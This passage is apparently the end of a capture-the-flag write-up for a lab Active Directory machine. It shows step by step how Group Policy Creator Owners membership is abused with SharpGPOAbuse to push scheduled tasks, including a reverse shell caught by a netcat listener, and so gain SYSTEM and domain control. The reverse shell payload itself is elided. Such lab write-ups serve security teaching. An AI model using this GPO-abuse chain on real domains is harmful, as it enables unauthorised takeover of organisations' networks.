BUILTIN\Remote Management Users                   Alias                    S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group,
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner,
```

***

## Alternative Method to Gain Full Domain Access (GPO Abuse)

### Enumeration

After getting a SYSTEM shell, I started enumerating domain users. The account that stood out was `m.schoolbus`, which is part of an interesting group:

```powershell
PS C:\> net user m.schoolbus
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
Account active               Yes
Account expires              Never
Local Group Memberships      *Remote Management Users
Global Group memberships     *Domain Users *Desktop Admins
```

The `Desktop Admins` group is a member of **Group Policy Creator Owners**, which implies that `m.schoolbus` has rights to create and manage **Group Policy Objects (GPOs)**.

Confirming with PowerShell:

```powershell
PS C:\Users\M.SchoolBus> get-adgroup "Desktop Admins" -Properties memberOf | Select-Object -ExpandProperty memberOf
CN=Group Policy Creator Owners,CN=Users,DC=frizz,DC=htb
```

And with `whoami /groups`:

```
frizz\Group Policy Creator Owners  (Enabled group)
```

This means the user can create and modify GPOs, which is a potential path to **domain privilege escalation**.

***

#### Background on GPO Abuse

Group Policy Objects (GPOs) control system policies and configurations across the Active Directory domain.\
If an attacker can create or modify GPOs, they can push **scheduled tasks, startup scripts, or privilege escalation commands** to domain-joined machines.

The tool **SharpGPOAbuse** is designed for this purpose.

***

#### Proof of Concept

First, I uploaded **SharpGPOAbuse.exe** to the target:

```bash
scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:/windows/temp/
```

Instead of modifying existing domain policies (which could be risky), I created my own GPO:

```powershell
PS C:\> New-GPO -name "sn0x"
DisplayName      : sn0x
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
```

Then I linked it to the domain:

```powershell
PS C:\> New-GPLink -Name "sn0x" -target "DC=frizz,DC=htb"
```

***

#### Testing Command Execution

I used SharpGPOAbuse to add a scheduled task that simply runs `whoami`:

```powershell
PS C:\> \windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "sn0x" --Author "sn0x" --TaskName "RevShell" --Command "powershell.exe" --Arguments "whoami > C:\Users\m.schoolbus\test"
```

Forcing a GPO update:

```powershell
gpupdate /force
```

Checking the output:

```powershell
PS C:\> type C:\Users\m.schoolbus\test
nt authority\system
```

Command execution confirmed&#x20;

***

#### Getting a Reverse Shell

Next, I created a second GPO for a **PowerShell reverse shell**:

```powershell
PS C:\> New-GPO -name "sn0x-rev"
PS C:\> New-GPLink -Name "sn0x-rev" -target "DC=frizz,DC=htb"
```

Added the reverse shell task:

```powershell
PS C:\> \windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "sn0x-rev" --Author "sn0x" --TaskName "RevShell" --Command "powershell.exe" --Arguments "<reverse shell payload>"
```

Forced update:

```powershell
gpupdate /force
```

On my listener:

```bash
nc -lnvp 443
```

I received a shell as:

```
PS C:\Windows\system32> whoami
nt authority\system
```

***

#### Domain Admin Access

From here, I had **full control of the domain**. Reading the Administrator’s desktop confirmed success:

```powershell
PS C:\users\administrator\desktop> type root.txt
65424e6c************************
```

***

### Conclusion

This is the **second method** of achieving full domain compromise:\
instead of relying only on privilege escalation on a single host, we **abuse GPO permissions** via the `Group Policy Creator Owners` group. Using **SharpGPOAbuse**, we created new GPOs, linked them to the domain, and used them to push commands and reverse shells — ultimately leading to **complete domain compromise**.



<br>
